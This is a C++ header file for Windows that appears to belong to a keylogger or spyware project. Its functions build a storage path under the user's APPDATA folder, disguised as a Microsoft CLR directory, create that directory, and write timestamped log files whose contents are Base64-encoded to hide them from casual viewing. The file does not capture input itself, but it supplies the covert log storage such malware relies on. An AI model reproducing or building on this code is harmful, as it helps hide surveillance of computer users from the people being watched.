#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{


std::string GetOurPath (const bool append_separarator = false)                          //checks if backslash is needed at the of the path, if its there
    {                                                                                   //its good else add it
        std::string appdata_dir (getenv("APPDATA"));                                    //gets the environmental variables which contains the APPDATA in it.

        std::string full = appdata_dir + "\\Microsoft\\CLR";                            //returns the full path

        return full + (append_separarator ? "\\" : "");                                 //if append_separator is false add "\\" otherwise don't
    }

bool MkOneDr (std::string path)                                                         //function to make a directory
    {
        return (bool)CreateDirectory (path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;      //returns a bool to CreateDirectory
    }
bool MkDir (std::string path)                                                           //If the path don't exist above function won't be able to
    {                                                                                   //create a directory. So this is a backup function.
                                                                                        // This function dynamically builds a full legal filepath.
                                                                                        //For each subdirectory, it checks if that is indeed legal.
                                                                                        //If it is, we continue to loop until we have built a full path.
        for (char &c : path)
            if (c == '\\')                                                              //if character encounters \\ then following should happen
            {
                c = '\0';                                                               //assign c as null character i.e. end of string

                if (!MkOneDr(path))                                                     //if not exists directory, return false and assign c as \\
                    return false;

                c = '\\';
            }
        return true;
    }
template <class T>
std::string WriteLog (const T &t)                                                            //Names log file by date so that we know when it was created
    {
        std::string path = GetOurPath (true);
        Helper::DateTime dt;                                                                 //Fetching DateTime dt from the helper file

        std::string name = dt.GetDateTimeString ("_") + ".log";
        try                                                                                  //Tries to open and write into the file
            {
                std::ofstream file (path + name);                                            //opens file at that path and name
                if (!file) return "";                                                        //If no file exists, return ""
                std::ostringstream s;

                s << "[" << dt.GetDateTimeString () << "]" << std::endl << t << std::endl;   //Syntax of writing into the file

                std::string data = Base64::EncryptB64 (s.str());                             //data string as encoded string

                file << data;                                                                //Output the data to the file
                if (!file)
                    return "";
                file.close();                                                                //Closes the file
                return name;
            }
        catch (...)
            {
                return "";                                                                   //If anything bad happens, return ""
            }
    }
}
#endif
